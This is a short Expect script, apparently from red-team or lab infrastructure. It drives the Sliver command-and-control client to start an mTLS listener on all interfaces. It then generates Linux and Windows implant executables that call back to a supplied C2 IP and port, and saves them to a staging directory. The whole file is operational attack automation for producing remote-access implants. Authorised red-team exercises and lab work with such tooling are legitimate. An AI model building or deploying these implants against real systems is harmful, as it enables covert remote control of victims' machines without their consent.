#!/usr/bin/expect -f
# Connects to the local Sliver server and generates Linux + Windows implants.
# Usage: expect gen-implants.expect <c2_ip> <c2_port> <staging_dir> <operator_cfg>

set c2_ip      [lindex $argv 0]
set c2_port    [lindex $argv 1]
set staging    [lindex $argv 2]
set cfg        [lindex $argv 3]
set timeout    600

spawn sliver-client --config $cfg

expect {
    "sliver >" {}
    timeout     { puts "ERROR: sliver-client did not reach prompt"; exit 1 }
}

# Start an mTLS listener
send "mtls --lhost 0.0.0.0 --lport $c2_port\r"
expect "sliver >"

# Generate Linux implant
send "generate --mtls $c2_ip:$c2_port --os linux --arch amd64 --format executable --save $staging/sliver-implant-linux\r"
expect -timeout 300 "sliver >"

# Generate Windows implant
send "generate --mtls $c2_ip:$c2_port --os windows --arch amd64 --format exe --save $staging/sliver-implant.exe\r"
expect -timeout 300 "sliver >"

send "exit\r"
expect eof
